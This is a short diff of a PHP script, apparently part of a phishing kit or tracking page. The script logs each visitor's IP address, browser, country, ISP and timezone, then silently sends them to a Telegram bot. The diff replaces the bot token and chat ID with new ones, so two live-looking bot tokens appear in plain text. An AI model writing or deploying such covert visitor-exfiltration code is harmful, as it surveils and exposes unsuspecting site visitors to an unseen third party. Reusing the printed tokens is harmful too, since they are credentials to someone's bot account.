@@ -20,10 +20,10 @@ $log = fopen("", "a") or die("Unable to open file!");
 		
 fwrite($log, "$ip $BROWSER $LOOKUP_COUNTRY $LOOKUP_ISP $LOOKUP_TIMEZONE");
 fclose($log);
-$token = "5394020347:AAG6Y8XTFMfPUKC9dyr2CoG5H6wGplbUPLs";
+$token = "6592198883:AAEN7aTyMwyU_6r3krNYjdZFT9R35XS6IgM";
 $data = [
     'text' => "$ip $BROWSER $LOOKUP_COUNTRY $LOOKUP_ISP $LOOKUP_TIMEZONE",
-    'chat_id' => '1045845538'
+    'chat_id' => '1055835354'
 ];
 
 file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query($data) );
